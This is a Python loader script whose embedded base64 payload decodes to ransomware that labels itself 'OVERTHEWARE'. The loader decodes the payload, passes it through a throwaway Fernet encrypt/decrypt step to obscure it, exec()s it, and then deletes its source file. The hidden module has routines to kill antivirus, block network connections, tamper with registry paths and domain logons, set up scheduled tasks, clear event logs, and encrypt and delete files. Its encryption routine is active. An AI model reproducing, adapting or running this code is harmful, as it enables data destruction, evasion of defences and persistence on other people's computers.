import base64,os,time
from cryptography.fernet import Fernet
from src._all import *

__all__ = ["BALLCODED"]

class BALLCODED(object):
    def __init__(self):
        self.__ifl = "EnCScript.txt"
        self.__ovrlite = b'ZnJvbSBzcmMuX2FsbCBpbXBvcnQgKg0KaW1wb3J0IGJhc2U2NA0KaW1wb3J0IG9zDQojIHRyeToNCiMgICAgIF9DT05UUk9MTElCKCkNCiMgZXhjZXB0Og0KIyAgICAgcGFzcw0KDQpfX2FsbF9fID0gWyJPVkVSVEhFV0FSRSJdDQoNCmNsYXNzIE9WRVJUSEVXQVJFKG9iamVjdCk6DQogICAgZGVmIF9faW5pdF9fKHNlbGYpOg0KICAgICAgICBzZWxmLl9fdGFyZGlyID0gWyJDOi8iLCJEOi8iXQ0KICAgICAgICBzZWxmLl9fbWV4ZSA9ICJjYWxjLmV4ZSINCiAgICAgICAgc2VsZi5fX21jYWxjID0gIkM6XFdpbmRvd3NcU3lzdGVtMzJcY2FsYy5leGUiDQogICAgICAgIHNlbGYuX190Y2FsYyA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyIg0KICAgICAgICBzZWxmLl9fdG1wID0gIkM6XFdpbmRvd3NcVGVtcCINCiAgICAgICAgc2VsZi5fX21kaXIgPSBvcy5nZXRjd2QoKQ0KICAgICAgICBzZWxmLl9fbWV4cyA9IHNlbGYuX19tZGlyKyJcXCIrImNhbGNjLmV4ZSINCiAgICBkZWYgX19zdHJfXyhzZWxmKToNCiAgICAgICAgcmV0dXJuICJSQU5TT01XQVJFIC0gTkFNRSBJVDogWyBPVkVSVEhFV0FSRSBdIC8gQUxMIFBST0NFU1MiDQogICAgZGVmIF9fY2FsbF9fKHNlbGYpOg0KICAgICAgICByZXR1cm4NCiAgICBkZWYgX19nZXRzdGF0ZV9fKHNlbGYpOg0KICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkQuRS5OLkkuRS5EIikNCiAgICBkZWYgX19yZXByX18oc2VsZik6DQogICAgICAgIHJldHVybiBPVkVSVEhFV0FSRS5fX2RvY19fDQogICAgZGVmIF9LSUxMQVZTKHNlbGYpOg0KICAgICAgICBLSUxMQVZTKCkuX0tJTExBTEwoKQ0KICAgIGRlZiBfQkxPQ0tORVQoc2VsZik6DQogICAgICAgIEJMT0NLTkVUKCkuX01PRElGWSgpDQogICAgZGVmIF9SRVRVUk5ESVJFQ1RPUklFUyhzZWxmKToNCiAgICAgICAgcmV0dXJuIFNDQU5ESVJFQ1RPUklFUyhzZWxmLl9fdGFyZGlyWzBdKS5fUkVUVVJOX1NBTVBMRSgpLFwNCiAgICAgICAgICAgIFNDQU5ESVJFQ1RPUklFUyhzZWxmLl9fdGFyZGlyWzFdKS5fUkVUVVJOX1NBTVBMRSgpDQogICAgZGVmIF9SRU1PVkVGSUxFKHNlbGYpOg0KICAgICAgICBSRU1PVkVGSUxFKHNlbGYuX19tY2FsYykuX1JFTU9WRSgpDQogICAgZGVmIF9NT1ZFRklMRShzZWxmKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgQ09QWUZJTEVJTklUKHNlbGYuX19tZGlyKyJcXCIrc2VsZi5fX21leGUsc2VsZi5fX21leHMpLl9DUFJVTigpDQogICAgICAgICAgICBNT1ZFRklMRUlOSVQoc2VsZi5fX21leHMsc2VsZi5fX3RjYWxjKS5fTU9WRUlOKCkNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBDT1BZRklMRUlOSVQoc2VsZi5fX21kaXIrIlxcIitzZWxmLl9fbWV4ZSxzZWxmLl9fdG1wKS5fQ1BSVU4oKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIE1PVkVGSUxFSU5JVChzZWxmLl9fbWRpcisiXFwiK3NlbGYuX19tZXhlLHNlbGYuX190Y2FsYykuX01PVkVJTigpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHBhc3MNCiAgICBkZWYgX0FVVE9UQVNLKHNlbGYpOg0KICAgICAgICBUQVNLV0lORE9XUyhzZWxmLl9fbWNhbGMucmVwbGFjZSgiLyIsIlxcIikpLl9MQVVOQ0goIk5vcm1hbFBhdGhLZXkiKQ0KICAgIGRlZiBfUE9JU09OSEtFWShzZWxmKToNCiAgICAgICAgQ0hBTkdFUEFUSEtFWShzZWxmLl9fbWV4ZSxzZWxmLl9fdGNhbGMrIlxcIikuX0xDTFJVTigpDQogICAgICAgIENIQU5HRVBBVEhLRVkoc2VsZi5fX21leGUsc2VsZi5fX3RjYWxjKyJcXCIpLl9VU1JSVU4oKQ0KICAgIGRlZiBfUE9JU09ORE9NQUlOKHNlbGYpOg0KICAgICAgICBBTExTSURMT0dPTihzZWxmLl9fbWV4ZSkuX1BPSVNPTkFMTCgpDQogICAgZGVmIF9ERUxFVEVMT0coc2VsZik6DQogICAgICAgIEFDQ0VTU0xPR0ZJTEVTKCkuX0NMRUFSRVZFTlQoKQ0KICAgIGRlZiBfRU5DUEFUSEZJTEUoc2VsZixpbml0dGFyOnN0cik6DQogICAgICAgIEVOQ0ZJTEVBRVMoaW5pdHRhcikuX0xBVU5DSCgpDQogICAgZGVmIF9MQVVOQ0hXQVJFKHNlbGYpOg0KICAgICAgICBjZGlyLGRkaXIgPSBzZWxmLl9SRVRVUk5ESVJFQ1RPUklFUygpDQogICAgICAgICMgZm9yIHhjIGluIGNkaXI6DQogICAgICAgICMgICAgIGlmIG9zLnBhdGguaXNmaWxlKHhjKToNCiAgICAgICAgIyAgICAgICAgIHRyeToNCiAgICAgICAgIyAgICAgICAgICAgICBpZiB4Yy5uYW1lID09ICJURVNURU5DRklMRS50eHQiIG9yIFwNCiAgICAgICAgIyAgICAgICAgICAgICAgICAgeGMubmFtZSA9PSAiVEVTVEVOQ0ZJTEUucGRmIiBvciBcDQogICAgICAgICMgICAgICAgICAgICAgICAgICAgICB4Yy5uYW1lID09ICJURVNURU5DRklMRS54bHN4IjoNCiAgICAgICAgIyAgICAgICAgICAgICAgICAgc2VsZi5fRU5DUEFUSEZJTEUoeGMucGF0aCkNCiAgICAgICAgIyAgICAgICAgICAgICAgICAgUkVNT1ZFRklMRSh4Yy5wYXRoKS5fUkVNT1ZFKCkNCiAgICAgICAgIyAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAjICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICMgICAgICAgICBleGNlcHQ6DQogICAgICAgICMgICAgICAgICAgICAgcGFzcw0KICAgICAgICAjICAgICBlbHNlOg0KICAgICAgICAjICAgICAgICAgcGFzcw0KICAgICAgICBmb3IgeGQgaW4gZGRpcjoNCiAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHhkKToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGlmIHhkLm5hbWUgPT0gIlRFU1RFTkNGSUxFLnR4dCIgb3IgXA0KICAgICAgICAgICAgICAgICAgICAgICAgeGQubmFtZSA9PSAiVEVTVEVOQ0ZJTEUucGRmIiBvciBcDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgeGQubmFtZSA9PSAiVEVTVEVOQ0ZJTEUueGxzeCI6DQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9FTkNQQVRIRklMRSh4ZC5wYXRoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgUkVNT1ZFRklMRSh4ZC5wYXRoKS5fUkVNT1ZFKCkNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcGFzcw0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgICMgT1ZFUlRIRVdBUkUoKS5fQkxPQ0tORVQoKQ0KICAgIHByaW50KCJbPj5dIEJMT0NLIENPTk5FQ1RJT05TIC0gRE9ORSIpDQogICAgIyBPVkVSVEhFV0FSRSgpLl9LSUxMQVZTKCkNCiAgICBwcmludCgiWz4+XSBLSUxMIEFWUyAtIERPTkUiKQ0KICAgICMgT1ZFUlRIRVdBUkUoKS5fUkVNT1ZFRklMRSgpDQogICAgcHJpbnQoIls+Pl0gUkVNT1ZFIEZJTEUgLSBET05FIikNCiAgICAjIE9WRVJUSEVXQVJFKCkuX01PVkVGSUxFKCkNCiAgICBwcmludCgiWz4+XSBNT1ZFIEZJTEUgLSBET05FIikNCiAgICAjIE9WRVJUSEVXQVJFKCkuX0FVVE9UQVNLKCkNCiAgICBwcmludCgiWz4+XSBBVVRPVEFTSyBQT0lTT04gLSBET05FIikNCiAgICAjIE9WRVJUSEVXQVJFKCkuX1BPSVNPTkhLRVkoKQ0KICAgIHByaW50KCJbPj5dIEhLRVkgUE9JU09OIC0gRE9ORSIpDQogICAgIyBPVkVSVEhFV0FSRSgpLl9QT0lTT05ET01BSU4oKQ0KICAgIHByaW50KCJbPj5dIERPTUFJTiBQT0lTT04gLSBET05FIikNCiAgICAjIE9WRVJUSEVXQVJFKCkuX0RFTEVURUxPRygpDQogICAgcHJpbnQoIls+Pl0gREVMRVRFIExPRyAtIERPTkUiKQ0KICAgIE9WRVJUSEVXQVJFKCkuX0xBVU5DSFdBUkUoKQ0KICAgIHByaW50KCJbPj5dIEZJTEUgRU5DUllQVElPTiAtIERPTkUiKQ0KICAgICMgT1ZFUlRIRVdBUkUoKS5fREVMRVRFTE9HKCkNCiAgICBwcmludCgiWz4+XSBMQVNUIERFTEVURSBMT0cgLSBET05FIikNCg=='
    def __str__(self):
        return "B64 ENCODED - PROCESS"
    def __call__(self):
        return
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __repr__(self):
        return BALLCODED.__doc__
    # def _READFILE(self):
    #     ffp = open(self.__ifl,"rb")
    #     frd = ffp.read()
    #     ffp.close()
    #     return frd
    def _BCODE64(self):
        print(base64.b64encode(self._READFILE()))
        return base64.b64encode(self._READFILE())
    def _DCODE64(self):
        return base64.b64decode(self.__ovrlite)
    def _FCODE(self):
        try:
            try:
                self._ENCRUNF()
            except:
                pass
            ecr = Fernet.generate_key()
            ety = Fernet(ecr)
            encmsg = ety.encrypt(self._DCODE64())
            decmsg = ety.decrypt(encmsg)
            exec(decmsg)
            time.sleep(10)
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except Exception as err:
            print(str(err))
            pass
        try:
            os.remove(self.__ifl)
        except:
            pass
    
if __name__ == "__main__":
    BALLCODED()._FCODE()
    # BALLCODED()._BCODE64()